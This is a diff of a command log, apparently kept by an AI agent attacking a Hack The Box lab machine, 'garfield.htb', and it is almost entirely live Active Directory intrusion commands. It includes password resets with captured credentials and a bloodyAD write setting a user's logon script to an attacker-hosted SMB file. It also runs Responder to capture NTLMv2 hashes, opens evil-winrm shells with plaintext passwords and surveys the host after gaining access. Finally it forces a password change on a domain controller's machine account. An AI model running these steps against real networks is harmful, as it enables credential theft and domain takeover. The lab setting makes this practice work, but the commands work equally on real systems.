@@ -1,75 +1,65 @@
-[10:32:48] RUN: which kpasswd.py smbpasswd.py changepasswd.py 2>/dev/null; find / -name "kpasswd*" -o -name "smbpasswd*" -o -name "changepasswd*" 2>/dev/null | grep -i impacket | head -10
-[10:32:49] RUN: pip list 2>/dev/null | grep -i krb5; dpkg -l | grep -i krb5 | head -5
-[10:32:53] RUN: python3 /usr/share/doc/python3-impacket/examples/changepasswd.py --help 2>&1 | head -30
-[10:32:58] RUN: python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle -altpass 'Th1sD4mnC4t!@1978' -newpass 'N3wP@ssw0rd!2026' garfield.htb/l.wilson@10.129.17.178 -dc-ip 10.129.17.178 -debug 2>&1
-[10:33:02] RUN: sudo ntpdate -u 10.129.17.178 2>&1
-[10:33:06] RUN: which rdate ntpdate ntpd chronyd faketime 2>/dev/null; apt list --installed 2>/dev/null | grep -i ntp; date -u
-[10:33:12] RUN: faketime -f '+8h0m0s' python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle -altpass 'Th1sD4mnC4t!@1978' -newpass 'N3wP@ssw0rd!2026' garfield.htb/l.wilson@10.129.17.178 -dc-ip 10.129.17.178 -debug 2>&1
-[10:33:16] RUN: sudo date -s "$(faketime -f '+8h0m0s' date -u '+%Y-%m-%d %H:%M:%S')" 2>&1; date -u
-[10:33:22] RUN: # faketime may not work well with network operations. Let's try datefudge or a different approach.
-# The server time is 18:33 UTC and our time is 10:33 UTC - that's 8 hours difference.
-# Let's try using the net command or a raw Python approach that handles the skew
-# First let's check if we can install ntpdate
-apt list ntpdate 2>/dev/null; which net rdate timedatectl 2>/dev/null
-[10:33:26] RUN: sudo apt-get install -y ntpdate 2>&1 | tail -5
-[10:33:30] RUN: sudo apt-get install -y ntpsec-ntpdate 2>&1 | tail -5
-[10:34:35] READ: /htb/state/creds.jsonl
-[10:34:36] RUN: cat /etc/resolv.conf 2>/dev/null; echo "---"; ip addr show tun0 2>/dev/null | grep inet
-[10:34:43] READ: /htb/machines/garfield/state/creds.jsonl
-[10:34:43] READ: /htb/machines/garfield/notes.md
-[10:34:46] READ: /htb/machines/garfield/notes.md
-[10:34:51] READ: /htb/machines/garfield/notes.md
-[10:34:57] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set object 'l.wilson' scriptPath -v '\\10.10.17.114\share\x.bat' 2>&1
-[10:35:01] RUN: which bloodyad bloody-ad python3 -c "import bloodyAD" 2>&1; pip show bloodyAD 2>&1 | head -5
-[10:35:06] RUN: python3 -m bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set object 'l.wilson' scriptPath -v '\\10.10.17.114\share\x.bat' 2>&1
-[10:35:10] RUN: find / -name "bloodyAD" -o -name "bloody*" 2>/dev/null | head -10; pip show bloodyAD 2>&1 | grep Location
-[10:35:23] RUN: /home/hacker/.local/bin/bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set object 'l.wilson' scriptPath -v '\\10.10.17.114\share\x.bat' 2>&1
-[10:36:40] READ: /htb/state/creds.jsonl
-[10:36:41] RUN: ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
-[10:36:44] READ: /htb/machines/garfield/state/creds.jsonl
-[10:36:49] RUN: ldapsearch -x -H ldap://10.129.17.178 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(sAMAccountName=l.wilson_adm)' dn scriptPath 2>&1 | head -20
-[10:36:58] RUN: pkill -f responder 2>/dev/null; sleep 1; sudo responder -I tun0 -v 2>&1 &
-RESPONDER_PID=$!
-echo "Responder PID: $RESPONDER_PID"
-# Wait up to 120 seconds watching for NTLMv2 hashes
-for i in $(seq 1 24); do
-  sleep 5
-  if [ -d /usr/share/responder/logs ] && ls /usr/share/responder/logs/*NTLM* 2>/dev/null; then
-    echo "=== HASH FOUND ==="
-    cat /usr/share/responder/logs/*NTLM* 2>/dev/null
-    break
-  fi
-  # Also check responder's default log locations
-  if [ -d /opt/responder/logs ] && ls /opt/responder/logs/*NTLM* 2>/dev/null; then
-    echo "=== HASH FOUND ==="
-    cat /opt/responder/logs/*NTLM* 2>/dev/null
-    break
-  fi
-  echo "Check $i/24 ($(($i * 5))s) - no hash yet"
-done
-echo "=== Responder output ==="
-cat /tmp/responder_out.txt 2>/dev/null || true
-[10:45:23] RUN: faketime '+8 hours' atexec.py 'YOURCOMPANY.COM/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 'schtasks /query /fo LIST /v' 2>&1 | head -100
-[10:45:24] RUN: cat state/surface.jsonl 2>/dev/null | grep -i domain | head -5
-[10:45:27] RUN: which faketime 2>/dev/null; dpkg -l | grep faketime 2>/dev/null; which ntpdate 2>/dev/null
-[10:45:32] RUN: which atexec.py 2>/dev/null; which impacket-atexec 2>/dev/null; find / -name "atexec*" -type f 2>/dev/null | head -5
-[10:45:37] RUN: export KRB5_CONFIG=/dev/null; faketime '+8 hours' /home/hacker/.local/bin/atexec.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 'schtasks /query /fo LIST' 2>&1 | head -100
-[10:45:43] RUN: faketime '+8 hours' rpcdump.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 2>&1 | grep -i "tsch\|task\|86D35949" | head -20
-[10:45:45] RUN: faketime '+8 hours' rpcdump.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 2>&1 | head -60
-[10:45:48] RUN: which rpcdump.py 2>/dev/null; find / -name "rpcdump*" -type f 2>/dev/null | head -5
-[10:45:54] RUN: LD_PRELOAD=/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME="+8h" /home/hacker/.local/bin/rpcdump.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 2>&1 | grep -i "tsch\|task\|86D35949\|ITaskScheduler" | head -20
-[10:46:06] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
-[10:46:09] RUN: LD_PRELOAD=/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME="+8h" python3 exploits/enum_tasks.py 2>&1
-[10:47:33] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
-[10:47:35] RUN: ls /htb/machines/garfield/exploits/enum_tasks.py 2>/dev/null && echo EXISTS || echo NEW
-[10:47:38] READ: /htb/machines/garfield/exploits/enum_tasks.py
-[10:47:49] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
-[10:47:51] RUN: faketime +8h python3 exploits/enum_tasks.py 2>&1
-[10:47:54] RUN: faketime '2026-04-07 20:00:00' python3 exploits/enum_tasks.py 2>&1
-[10:47:59] RUN: python3 exploits/enum_tasks.py 2>&1
-[10:50:04] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
-[10:50:07] GLOB: /htb/machines/garfield/exploits/enum_tasks.py
-[10:50:09] READ: /htb/machines/garfield/exploits/enum_tasks.py
-[10:50:25] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
-[10:50:28] RUN: python3 exploits/enum_tasks.py 2>&1
-[10:50:43] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
+[10:53:45] READ: /htb/state/creds.jsonl
+[10:53:49] GREP: l\.wilson_adm.*password|l\.wilson_adm.*P@ss|secret.*l\.wilson
+[10:53:49] GREP: P@ssw0rd
+[10:53:56] RUN: echo '{"action":"l.wilson_adm post-shell survey: whoami /all, net user, hostname, systeminfo, net localgroup administrators, klist","ts":"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}' >> logs/actions.jsonl
+[10:54:01] RUN: evil-winrm -i 10.129.17.178 -u l.wilson_adm -p 'P@ssw0rd2026!' -c '' -k '' 2>&1 <<'CMDS'
+whoami /all
+echo ===SEPARATOR1===
+net user l.wilson_adm /domain
+echo ===SEPARATOR2===
+hostname
+echo ===SEPARATOR3===
+ipconfig
+echo ===SEPARATOR4===
+net localgroup administrators
+echo ===SEPARATOR5===
+klist
+echo ===SEPARATOR6===
+cmdkey /list
+echo ===SEPARATOR7===
+systeminfo
+exit
+CMDS
+[10:54:04] RUN: gem install rubyzip 2>&1 | tail -3
+[10:54:10] RUN: evil-winrm -i 10.129.17.178 -u l.wilson_adm -p 'P@ssw0rd2026!' 2>&1 <<'CMDS'
+whoami /all
+echo ===SEP1===
+net user l.wilson_adm /domain
+echo ===SEP2===
+hostname
+echo ===SEP3===
+ipconfig
+echo ===SEP4===
+net localgroup administrators
+echo ===SEP5===
+klist
+echo ===SEP6===
+cmdkey /list
+exit
+CMDS
+[10:54:12] RUN: gem list rubyzip 2>&1
+[10:54:17] RUN: GEM_PATH=/home/hacker/.local/share/gem/ruby/3.3.0:/var/lib/gems/3.3.0:/usr/local/lib/ruby/gems/3.3.0:/usr/lib/ruby/gems/3.3.0:/usr/lib/x86_64-linux-gnu/ruby/gems/3.3.0:/usr/share/rubygems-integration/3.3.0:/usr/share/rubygems-integration/all:/usr/lib/x86_64-linux-gnu/rubygems-integration/3.3.0 gem install rubyzip -i /var/lib/gems/3.3.0 2>&1 | tail -3
+[10:54:21] RUN: sudo gem install rubyzip 2>&1 | tail -3
+[10:54:26] RUN: evil-winrm -i 10.129.17.178 -u l.wilson_adm -p 'P@ssw0rd2026!' 2>&1 <<'CMDS'
+whoami /all
+echo ===SEP1===
+net user l.wilson_adm /domain
+echo ===SEP2===
+hostname
+echo ===SEP3===
+net localgroup administrators
+echo ===SEP4===
+klist
+echo ===SEP5===
+cmdkey /list
+exit
+CMDS
+[11:00:06] RUN: cat /htb/state/creds.jsonl | grep l.wilson_adm
+[11:00:09] RUN: cat /htb/state/creds.jsonl
+[11:00:13] RUN: grep -ri "l.wilson_adm" /htb/machines/garfield/ --include="*.md" --include="*.jsonl" --include="*.txt" --include="*.log" 2>/dev/null | head -30
+[11:00:19] RUN: echo '{"action":"test ForceChangePassword on RODC01$ via l.wilson_adm using bloodyAD","ts":"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}' >> /htb/machines/garfield/logs/actions.jsonl
+[11:00:21] RUN: echo '{"current_hypothesis":"l.wilson_adm has ForceChangePassword rights on RODC01$ machine account","set_at":"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}' > /tmp/.claude_reasoning_state.json
+[11:00:26] RUN: faketime +8h bloodyAD --host 10.129.17.178 -d garfield.htb -u l.wilson_adm -p 'P@ssw0rd2026!' set password 'RODC01$' 'NewRodcPass123!' 2>&1
+[11:00:30] RUN: faketime '+8 hours' bloodyAD --host 10.129.17.178 -d garfield.htb -u l.wilson_adm -p 'P@ssw0rd2026!' set password 'RODC01$' 'NewRodcPass123!' 2>&1
+[11:00:34] RUN: which bloodyAD 2>/dev/null; which faketime 2>/dev/null; pip show bloodyAD 2>/dev/null | head -3
+[11:00:38] RUN: faketime '+8 hours' python3 -c "from bloodyAD import main; print('ok')" 2>&1
